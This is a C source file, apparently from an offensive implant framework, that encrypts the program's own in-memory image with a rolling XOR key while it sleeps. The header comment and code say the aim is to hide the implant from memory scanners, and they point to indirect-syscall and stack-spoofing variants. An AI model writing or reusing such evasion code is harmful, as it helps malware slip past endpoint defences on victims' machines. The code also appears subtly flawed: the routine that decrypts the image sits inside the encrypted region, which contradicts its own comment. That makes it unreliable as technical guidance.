/*
 * src/stealth/sleep/sleep_xor_baseline.c
 *
 * Single-thread XOR sleep obfuscation. The cycle:
 *
 *  1. Derive a 256-byte rolling key from RDTSC + GetTickCount(), both
 *  cheap and unpredictable enough that two consecutive sleep
 *  cycles never use the same key.
 *  2. Flip the entire image (image_base..image_size) to PAGE_READWRITE
 *  via the runtime layer. With WRAITH_F_INDIRECT_SYSCALLS this goes
 *  through the Hell's Hall engine.
 *  3. XOR every byte of the image with the rolling key. The PE
 *  headers ("MZ", "PE\0\0", import strings) become opaque.
 *  4. Sleep for `duration_ms` milliseconds via plain kernel32!Sleep -
 *  the calling thread parks in `NtWaitForSingleObject` inside
 *  kernel space, so RIP is never inside the encrypted region.
 *  5. XOR-decrypt with the same key.
 *  6. Re-apply per-section protections (RX for code, RW for data,
 *  etc.) so subsequent calls into the module work normally.
 *
 * This is the baseline: it does NOT spoof the call stack or hide the
 * thread, and a memory scanner that scans during step (3..5) sees
 * scrambled bytes - that's the whole point. The Cronos and stack-spoof
 * variants layer additional concealment on top of this primitive.
 */

#include "core/wr_context_internal.h"
#include "runtime/rt_api.h"
#include "stealth/sleep/sleep.h"

#include <intrin.h>
#include <stdint.h>
#include <string.h>
#include <windows.h>

#define WRAITH_XOR_KEY_BYTES 256

static void derive_key(uint8_t *key, size_t len)
{
  uint64_t r1 = __rdtsc();
  uint64_t r2 = (uint64_t)GetTickCount64();
  /* Mix the two sources so neither one alone determines a byte. */
  uint64_t state = r1 ^ (r2 << 32) ^ (r2 >> 1);
  for (size_t i = 0; i < len; ++i) {
  state = state * 6364136223846793005ULL + 1442695040888963407ULL;
  key[i] = (uint8_t)(state >> 56);
  }
}

static void xor_buffer(uint8_t *buf, size_t len, const uint8_t *key,
  size_t key_len)
{
  for (size_t i = 0; i < len; ++i) {
  buf[i] ^= key[i % key_len];
  }
}

wraith_status_t wr_sleep_xor_cycle(struct wr_ctx *ctx, uint32_t duration_ms)
{
  if (!ctx || !ctx->image_base || ctx->image_size == 0 || !ctx->rt_ops) {
  return WRAITH_E_NULL_ARG;
  }

  uint8_t key[WRAITH_XOR_KEY_BYTES];
  derive_key(key, sizeof(key));

  /* (1) Flip whole image to RW. */
  unsigned old = 0;
  int rc = ctx->rt_ops->nt_protect(ctx->image_base, ctx->image_size,
  PAGE_READWRITE, &old);
  if (rc != 0) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_PROTECT_FAILED,
  "sleep: bulk RW flip -> 0x%x", (unsigned)rc);
  }

  /* (2) Encrypt. */
  xor_buffer((uint8_t *)ctx->image_base, ctx->image_size, key, sizeof(key));

  /* (3) Sleep. The calling thread parks in NtWaitForSingleObject
  * inside the kernel - RIP is never inside our encrypted region
  * during this window. */
  Sleep(duration_ms);

  /* (4) Decrypt. */
  xor_buffer((uint8_t *)ctx->image_base, ctx->image_size, key, sizeof(key));

  /* (5) Wipe the key from the stack so a post-sleep memory scan of
  * the parent frame can't recover it. */
  SecureZeroMemory(key, sizeof(key));

  /* (6) Restore proper per-section protections. */
  return wr_sleep_reapply_section_protections(ctx);
}
